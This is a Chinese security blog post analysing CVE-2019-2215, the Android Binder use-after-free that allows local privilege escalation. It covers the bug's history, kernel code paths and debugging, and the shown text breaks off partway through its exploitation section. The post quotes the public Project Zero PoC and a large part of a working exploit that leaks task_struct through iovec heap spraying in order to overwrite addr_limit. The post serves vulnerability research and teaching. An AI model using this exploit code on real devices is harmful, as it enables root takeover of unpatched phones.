<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="Kuekiko ">
<meta name="description" content="0x00 前言 CVE-2019-2215最初是由syzbot(syzkaller bot)在2017年发现的一个bug，在2018年初该bug被修复，没有分配CVE编号，但是该补丁没有向后移植到许多已发布的设备上,比如Pixel和pixel2。
Project Zero的**Maddie Stone (@maddiestone)**根据Google的威胁情报小组（TAG）的情报报告再次发现的该bug，她在2019年9月报告了该漏洞。TAG确认其已用于现实攻击中，TAG表示该漏洞利用可能跟一家出售漏洞和利用工具的以色列公司NSO有关，随后NSO集团发言人公开否认与该漏洞存在任何关系。
0x01 分析环境  Android avd api29 x86_64 kernel：q-goldfish-android-goldfish-4.14-dev commit id 7a3cee43e935b9d526ad07f20bf005ba7e74d05b pixel Android 10 kernel 3.18  0x02 漏洞分析 漏洞为内核上Bind IPC的一个UAF漏洞，成功利用可本地提权，无需进行任何交互，已被恶意软件利用。
原理分析 先看一个project-zero公开的poc
/* binder_poll() passes the thread-&amp;gt;wait waitqueue that can be slept on for work. When a thread that uses epoll explicitly exits using BINDER_THREAD_EXIT, the waitqueue is freed, but it is never removed from the corresponding epoll data structure. When the process subsequently exits, the epoll cleanup code tries to access the waitlist, which results in a use-after-free." />
<meta name="keywords" content=", CVE, Android提权" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="#252627" />
<link rel="canonical" href="https://kuekiko.top/posts/2020/06/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/" />


    <title>
        
            CVE-2019-2215分析利用记录 :: Kuekiko` blog  — Recorded living tip
        
    </title>




<link href="https://cdn.bootcdn.net/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://kuekiko.top/main.154a87e0ff720e102948892a8eb80881aa81a4faf37376f3093be219f6296c3d.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://kuekiko.top/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://kuekiko.top/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://kuekiko.top/favicon-16x16.png">
    <link rel="manifest" href="https://kuekiko.top/site.webmanifest">
    <link rel="mask-icon" href="https://kuekiko.top/safari-pinned-tab.svg" color="#252627">
    <link rel="shortcut icon" href="https://kuekiko.top/favicon.ico">
    <meta name="msapplication-TileColor" content="#252627">
    <meta name="theme-color" content="#252627">



<meta itemprop="name" content="CVE-2019-2215分析利用记录">
<meta itemprop="description" content="CVE-2019-2215分析利用记录">
<meta itemprop="datePublished" content="2020-06-30T01:15:26+08:00" />
<meta itemprop="dateModified" content="2020-06-30T01:15:26+08:00" />
<meta itemprop="wordCount" content="2333">
<meta itemprop="image" content="https://kuekiko.top"/>



<meta itemprop="keywords" content="CVE,Android提权," />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://kuekiko.top"/>

<meta name="twitter:title" content="CVE-2019-2215分析利用记录"/>
<meta name="twitter:description" content="CVE-2019-2215分析利用记录"/>



    <meta property="og:title" content="CVE-2019-2215分析利用记录" />
<meta property="og:description" content="CVE-2019-2215分析利用记录" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://kuekiko.top/posts/2020/06/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/" />
<meta property="og:image" content="https://kuekiko.top"/>
<meta property="article:published_time" content="2020-06-30T01:15:26+08:00" />
<meta property="article:modified_time" content="2020-06-30T01:15:26+08:00" />




    <meta property="article:section" content="CVE" />

    <meta property="article:section" content="Android提权" />

    <meta property="article:section" content="漏洞分析" />



    <meta property="article:published_time" content="2020-06-30 01:15:26 &#43;0800 CST" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://kuekiko.top/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text"># cd ~/kuekiko/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://kuekiko.top/posts/">Posts</a></li><li><a href="https://kuekiko.top/reading/">Reading</a></li><li><a href="https://kuekiko.top/todo/">Todo</a></li><li><a href="https://kuekiko.top/about/">About</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>11 minutes

            

            </p>
        </div>

        <article>
            <h1 class="post-title">
                <a href="https://kuekiko.top/posts/2020/06/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/">CVE-2019-2215分析利用记录</a>
            </h1>

            

            <div class="post-content">
                <h3 id="0x00-前言">0x00 前言</h3>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2215">CVE-2019-2215</a>最初是由syzbot(syzkaller bot)在2017年发现的一个<a href="https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/eLGkcwk9AQAJ">bug</a>，在2018年初该bug被修复，没有分配CVE编号，但是该补丁没有向后移植到许多已发布的设备上,比如Pixel和pixel2。</p>
<p><strong>Project Zero</strong>的**Maddie Stone (@maddiestone)**根据Google的威胁情报小组（TAG）的情报报告再次发现的该bug，她在2019年9月报告了该<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942">漏洞</a>。TAG确认其已用于现实攻击中，TAG表示该漏洞利用可能跟一家出售漏洞和利用工具的以色列公司NSO有关，随后NSO集团发言人公开否认与该漏洞存在任何关系。</p>
<h3 id="0x01-分析环境">0x01 分析环境</h3>
<ul>
<li>Android avd api29 x86_64</li>
<li>kernel：q-goldfish-android-goldfish-4.14-dev commit id <code>7a3cee43e935b9d526ad07f20bf005ba7e74d05b</code></li>
<li>pixel Android 10 kernel 3.18</li>
</ul>
<h3 id="0x02-漏洞分析">0x02 漏洞分析</h3>
<p>漏洞为内核上Bind IPC的一个UAF漏洞，成功利用可本地提权，无需进行任何交互，已被恶意软件利用。</p>
<h4 id="原理分析">原理分析</h4>
<p>先看一个project-zero公开的<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942">poc</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
</span><span style="color:#75715e">binder_poll() passes the thread-&gt;wait waitqueue that
</span><span style="color:#75715e">can be slept on for work. When a thread that uses
</span><span style="color:#75715e">epoll explicitly exits using BINDER_THREAD_EXIT,
</span><span style="color:#75715e">the waitqueue is freed, but it is never removed
</span><span style="color:#75715e">from the corresponding epoll data structure. When
</span><span style="color:#75715e">the process subsequently exits, the epoll cleanup
</span><span style="color:#75715e">code tries to access the waitlist, which results in
</span><span style="color:#75715e">a use-after-free. 
</span><span style="color:#75715e">*/</span>
<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/epoll.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#define BINDER_THREAD_EXIT 0x40046208ul
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    <span style="color:#66d9ef">int</span> fd, epfd;
    <span style="color:#66d9ef">struct</span> epoll_event event <span style="color:#f92672">=</span> {.events <span style="color:#f92672">=</span> EPOLLIN};

    fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/binder&#34;</span>, O_RDONLY);
    epfd <span style="color:#f92672">=</span> epoll_create(<span style="color:#ae81ff">1000</span>);
    epoll_ctl(epfd, EPOLL_CTL_ADD, fd, <span style="color:#f92672">&amp;</span>event); <span style="color:#75715e">//[1]
</span><span style="color:#75715e"></span>    ioctl(fd, BINDER_THREAD_EXIT, NULL); <span style="color:#75715e">//[2]
</span><span style="color:#75715e"></span>}
</code></pre></div><p>漏洞原理作者说的很简单就是使用epoll线程调用BINDER_THREAD_EXIT时，会把binder_thread释放，但是没有在epoll数据结构中清除，在后面进程结束或者epoll主动调用EPOLL_CTL_DEL时，epoll又会去遍历前面释放的binder_thread-&gt;wait，导致UAF。</p>
<p>既然是个UAF的漏洞，我们主要关注三个点：binder_thread的allocate、free、use。</p>
<ul>
<li><strong>allocate</strong></li>
</ul>
<p>在poc中的[1]处，通过epoll_ctl创建了一个新的ep_item并且绑定了fd，将其插入到event_poll的红黑树中。fd为前面通过调用open()创建的binder_proc结构体并且<code>fd-&gt;pricate_data = binder_proc</code>，epfd为调用epoll_create创建的一个epoll结构体，该结构体会添加到结构体队列上。结构大概如图，<a href="https://github.com/sharif-dev/AndroidKernelVulnerability">图来源</a></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200628024448.png" alt=""></p>
<ul>
<li><strong>free</strong></li>
</ul>
<p>poc中的[2]处，调用ioctl对fd进行BINDER_THREAD_EXIT操作，从<code>fd-&gt;private_data</code>中释放<strong>binder_thread</strong>结构体。整个调用栈如下图所示。最终调用到了binder_free_thread里的kfree释放掉。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200628102722.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">binder_free_thread</span>(<span style="color:#66d9ef">struct</span> binder_thread <span style="color:#f92672">*</span><span style="color:#66d9ef">thread</span>)
{
	BUG_ON(<span style="color:#f92672">!</span>list_empty(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>todo));
	binder_stats_deleted(BINDER_STAT_THREAD);
	binder_proc_dec_tmpref(<span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>proc);
	put_task_struct(<span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>task);
	kfree(<span style="color:#66d9ef">thread</span>);
}
</code></pre></div><ul>
<li><strong>use</strong></li>
</ul>
<p>在当前线程退出时，会自动调用<strong>epoll_ctl(epfd, DEL, fd, event)</strong>，这里面会调用到<strong>ep_remove(event_poll, ep_item)</strong>，这个方法里面会进行unlink wait queues双链表操作，其中的操作<code>entry = wait-&gt;entry;</code>这里的指针指向已经释放的binder_thread-&gt;wait。造成use after free。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/eq_remove_queue.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ep_remove_wait_queue</span>(<span style="color:#66d9ef">struct</span> eppoll_entry <span style="color:#f92672">*</span>pwq)  <span style="color:#75715e">//这里的pwq就是我们已经释放掉的binder_thread
</span><span style="color:#75715e"></span>{
	wait_queue_head_t <span style="color:#f92672">*</span>whead;
	rcu_read_lock();
	whead <span style="color:#f92672">=</span> smp_load_acquire(<span style="color:#f92672">&amp;</span>pwq<span style="color:#f92672">-&gt;</span>whead);
	<span style="color:#66d9ef">if</span> (whead)
		remove_wait_queue(whead, <span style="color:#f92672">&amp;</span>pwq<span style="color:#f92672">-&gt;</span>wait); <span style="color:#75715e">//进入remove_wait_queue
</span><span style="color:#75715e"></span>	rcu_read_unlock();
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">remove_wait_queue</span>(<span style="color:#66d9ef">struct</span> wait_queue_head <span style="color:#f92672">*</span>wq_head, <span style="color:#66d9ef">struct</span> wait_queue_entry <span style="color:#f92672">*</span>wq_entry)
{
	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> flags;

	spin_lock_irqsave(<span style="color:#f92672">&amp;</span>wq_head<span style="color:#f92672">-&gt;</span>lock, flags);
	__remove_wait_queue(wq_head, wq_entry);  <span style="color:#75715e">//这里传入的第二个参数&amp;pwq-&gt;wait之前已经被释放
</span><span style="color:#75715e"></span>	spin_unlock_irqrestore(<span style="color:#f92672">&amp;</span>wq_head<span style="color:#f92672">-&gt;</span>lock, flags);
}
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span>
<span style="color:#a6e22e">__remove_wait_queue</span>(<span style="color:#66d9ef">struct</span> wait_queue_head <span style="color:#f92672">*</span>wq_head, <span style="color:#66d9ef">struct</span> wait_queue_entry <span style="color:#f92672">*</span>wq_entry)
{
        list_del(<span style="color:#f92672">&amp;</span>wq_entry<span style="color:#f92672">-&gt;</span>entry);
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">list_del</span>(<span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>entry)
{
        __list_del_entry(entry);
        [...]
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">__list_del_entry</span>(<span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>entry)
{
        [...]
        __list_del(entry<span style="color:#f92672">-&gt;</span>prev, entry<span style="color:#f92672">-&gt;</span>next);
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">__list_del</span>(<span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span> prev, <span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span> next)
{
        next<span style="color:#f92672">-&gt;</span>prev <span style="color:#f92672">=</span> prev; <span style="color:#75715e">//unlink操作
</span><span style="color:#75715e"></span>        WRITE_ONCE(prev<span style="color:#f92672">-&gt;</span>next, next);
}
</code></pre></div><p>将<code>binder_thread-&gt;wait.head</code>的指针写入<code>binder_thread-&gt;wait.head.prev</code>和<code>binder_thread-&gt;wait.head.next</code>。</p>
<h4 id="poc调试分析">Poc调试分析</h4>
<p>这里手上没有直接能用的设备，用的模拟器调试。可直接按照<a href="https://cloudfuzz.github.io/android-kernel-exploitation/chapters/environment-setup.html#software-requirements">这个教程</a>的配置调试。不过这个教程关闭了一些保护，使得利用要简单些，不过过程是差不多一样的。</p>
<p>编译完goldfish后启动<code>emulator -show-kernel -no-snapshot -wipe-data -avd 2019-2215 -kernel bzImage -qemu -s -S</code>等待qemu的连接。</p>
<p>gdb启动<code>gdb -quiet vmlinux -ex 'target remote :1234'</code> 键入c继续启动模拟器。</p>
<p>等待模拟器完全启动后编译poc push进模拟器。</p>
<p>binder_thread释放之前，偏移a8处为<code>wait.head</code>的值，这里我们拥有内核源码以及编译好的vmliux，所以可以直接算出来<code>wait.head</code>相对于binder_thread地址的偏移量。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/b1.png" alt=""></p>
<p>free之后未unlink之前binder_thread的值一样未变。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/b2.png" alt=""></p>
<p>unlink之后，binder_thread-&gt;wait.head写入<code>binder_thread-&gt;wait.head.next</code> and <code>binder_thread-&gt;wait.head.prev</code>两个指针。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/b3.png" alt=""></p>
<p>在未开启KASan的设备上我们看不到任何奔溃。但是调试时我们能看到确实触发了漏洞。</p>
<h3 id="0x03-漏洞利用">0x03 漏洞利用</h3>
<p>漏洞t_thread结构体如下：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> binder_thread {
        <span style="color:#66d9ef">struct</span> binder_proc <span style="color:#f92672">*</span>proc;
        <span style="color:#66d9ef">struct</span> rb_node rb_node;
        <span style="color:#66d9ef">struct</span> list_head waiting_thread_node;
        <span style="color:#66d9ef">int</span> pid;
        <span style="color:#66d9ef">int</span> looper;              <span style="color:#75715e">/* only modified by this thread */</span>
        <span style="color:#66d9ef">bool</span> looper_need_return; <span style="color:#75715e">/* can be written by other thread */</span>
        <span style="color:#66d9ef">struct</span> binder_transaction <span style="color:#f92672">*</span>transaction_stack;
        <span style="color:#66d9ef">struct</span> list_head todo;
        <span style="color:#66d9ef">bool</span> process_todo;
        <span style="color:#66d9ef">struct</span> binder_error return_error;
        <span style="color:#66d9ef">struct</span> binder_error reply_error;
        wait_queue_head_t wait;
        <span style="color:#66d9ef">struct</span> binder_stats stats;
        atomic_t tmp_ref;
        <span style="color:#66d9ef">bool</span> is_dead;
        <span style="color:#66d9ef">struct</span> task_struct <span style="color:#f92672">*</span>task;
};
</code></pre></div><p>注意看该结构体中有个task成员，为task_struct类型。我们首先要做的就是泄露这个结构体的地址，将它改为NULL之后，执行提权语句。下面根据<a href="https://github.com/sharif-dev/AndroidKernelVulnerability/blob/master/exploit.cpp">exp</a>分析整个提权的流程。</p>
<h4 id="patch-addr_limit">patch addr_limit</h4>
<p>阻止我们拿到权限的第一道关卡为task_struct结构体成员thread_info中的addr_limit（在x86_64上是直接作为task_struct的成员），用于隔离内核空间和用户空间。如果我们能控制它的值，相当于我们能完全的访问内核空间。所以第一步就是把addr_limit patch掉。</p>
<p>想要patch掉addr_limit，得先泄露出task_struct的地址，再将值改为<code>0xFFFFFFFFFFFFFFFE</code>。后面再说为什么要改为这个值。</p>
<p>这里先了解一下<strong>vectored I/O</strong>，也称为分散/聚集 I/O，是一种可以在单次系统调用中对多个缓冲区输入输出的方法，可以把多个缓冲区的数据写到单个数据流，也可以把单个数据流读到多个缓冲区中。与线性 I/O 相比，vectored I/O有一些优势：可以使用不连续的不同缓冲区进行写入或读取，而不会产生大量开销。支持原子性。使用vectored I/O可以将头部和数据保存在单独的非连续缓冲区中，并通过一个系统调用而不是两个系统调用对其进行读取或写入。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200629154204.png" alt=""></p>
<p>readv() 函数从文件描述符 fd 中读取 count 个段 (segment) (一个段即一个 iovec 结构体）到参数 iov 所指定的缓冲区中。</p>
<p>write() 函数从参数 iov 指定的缓冲区中读取 count 个段的数据，并写入 fd 中。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/uio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>ssize_t <span style="color:#a6e22e">readv</span> (<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> iovec <span style="color:#f92672">*</span>iov,vint count);
ssize_t <span style="color:#a6e22e">writev</span>(<span style="color:#66d9ef">int</span> fd,<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> iovec <span style="color:#f92672">*</span>iov, <span style="color:#66d9ef">int</span> count);
</code></pre></div><p>每个 iovec 结构体描述一个独立的，物理不连续的缓冲区，我们称其为段(segment)，每个iovec结构体相对较小，在64bit系统下iovec的大小仅为0x10。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> iovec
{
    <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>iov_base;    <span style="color:#75715e">/* BSD uses caddr_t (1003.1g requires void *) */</span>
    __kernel_size_t iov_len; <span style="color:#75715e">/* Must be size_t (1003.1g) */</span>
};
</code></pre></div><p>如何泄露出task_struct？看了几个exp，都用的是<code>struct iovec</code>去占位覆盖前面释放的binder_thread。这也是Project Zero的做法。这个方法最初是由Keen实验室提出的，iovec具有一些小特性使得它很适合用来作为攻击的媒介：</p>
<ol>
<li>在64bit系统下只有0x10的大小</li>
<li>容易控制它的成员iov_base和iov_len。</li>
<li>可以控制写入的个数控制iovec最终进入哪个kmalloc缓存</li>
<li>它有一个指向缓冲区的指针和一个长度，这是使用unlink进行破坏的理想字段</li>
</ol>
<p>可通过readv、writev、recvmsg、sendmsg等系统调用和iovec是实现linux下的Vectored I/O。在漏洞利用中我们可以利用来绕过检查，对已释放的空间进行占位布局堆风水。</p>
<p>看看exp如何如来泄露信息，作者写了很详细的注释：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> BinderUaF<span style="color:#f92672">::</span>leakTaskStruct() {
    <span style="color:#66d9ef">int</span> pipe_fd[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
    ssize_t nBytesRead <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> dataBuffer[PAGE_SIZE] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
    <span style="color:#66d9ef">struct</span> iovec iovecStack[IOVEC_COUNT] <span style="color:#f92672">=</span> {nullptr};
    <span style="color:#75715e">// Get binder fd
</span><span style="color:#75715e"></span>    setupBinder();
    <span style="color:#75715e">// Create event poll
</span><span style="color:#75715e"></span>    setupEventPoll();
    <span style="color:#75715e">// We are going to use iovec for scoped read/write,
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// we need to make sure that iovec stays in the kernel
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// before we trigger the unlink after binder_thread has
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// been freed.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// One way to achieve this is by using the blocking APIs
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// in Linux kernel. Such APIs are read, write, etc on pipe.
</span><span style="color:#75715e"></span>
    <span style="color:#75715e">// Setup pipe for iovec
</span><span style="color:#75715e"></span>    INFO(<span style="color:#e6db74">&#34;[+] Setting up pipe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

    <span style="color:#66d9ef">if</span> (pipe(pipe_fd) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] Unable to create pipe</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        exit(EXIT_FAILURE);
    } <span style="color:#66d9ef">else</span> {
        INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Pipe created successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    }
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// pipe_fd[0] = read fd
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// pipe_fd[1] = write fd
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Default size of pipe is 65536 = 0x10000 = 64KB
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// This is way much of data that we care about
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Let&#39;s reduce the size of pipe to 0x1000
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (fcntl(pipe_fd[<span style="color:#ae81ff">0</span>], F_SETPIPE_SZ, PAGE_SIZE) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] Unable to change the pipe capacity</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        exit(EXIT_FAILURE);
    } <span style="color:#66d9ef">else</span> {
        INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Changed the pipe capacity to: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, PAGE_SIZE);
    }
    INFO(<span style="color:#e6db74">&#34;[+] Setting up iovecs</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// As we are overlapping binder_thread with iovec,
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// binder_thread-&gt;wait.lock will align to iovecStack[10].io_base.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// If binder_thread-&gt;wait.lock is not 0 then the thread will get
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// stuck in trying to acquire the lock and the unlink operation
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// will not happen.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// To avoid this, we need to make sure that the overlapped data
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// should be set to 0.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// iovec.iov_base is a 64bit value, and spinlock_t is 32bit, so if
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// we can pass a valid memory address whose lower 32bit value is 0,
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// then we can avoid spin lock issue.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    mmap4gbAlignedPage();
    iovecStack[IOVEC_WQ_INDEX].iov_base <span style="color:#f92672">=</span> m_4gb_aligned_page;
    iovecStack[IOVEC_WQ_INDEX].iov_len <span style="color:#f92672">=</span> PAGE_SIZE;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x41414141</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">=</span> PAGE_SIZE;

    <span style="color:#75715e">// Now link the poll wait queue to binder thread wait queue
</span><span style="color:#75715e"></span>    linkEventPollWaitQueueToBinderThreadWaitQueue();
    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// We should trigger the unlink operation when we
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// have the binder_thread reallocated as iovec array
</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Now fork
</span><span style="color:#75715e"></span>    pid_t childPid <span style="color:#f92672">=</span> fork();
    <span style="color:#66d9ef">if</span> (childPid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// child process
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// There is a race window between the unlink and blocking
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// in writev, so sleep for a while to ensure that we are
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// blocking in writev before the unlink happens
</span><span style="color:#75715e"></span>        sleep(<span style="color:#ae81ff">2</span>);
        <span style="color:#75715e">// Trigger the unlink operation on the reallocated chunk
</span><span style="color:#75715e"></span>        unlinkEventPollWaitQueueFromBinderThreadWaitQueue();
        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// First interesting iovec will read 0x1000 bytes of data.
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// This is just the junk data that we are not interested in
</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        nBytesRead <span style="color:#f92672">=</span> read(pipe_fd[<span style="color:#ae81ff">0</span>], dataBuffer, <span style="color:#66d9ef">sizeof</span>(dataBuffer));
        <span style="color:#66d9ef">if</span> (nBytesRead <span style="color:#f92672">!=</span> PAGE_SIZE) {
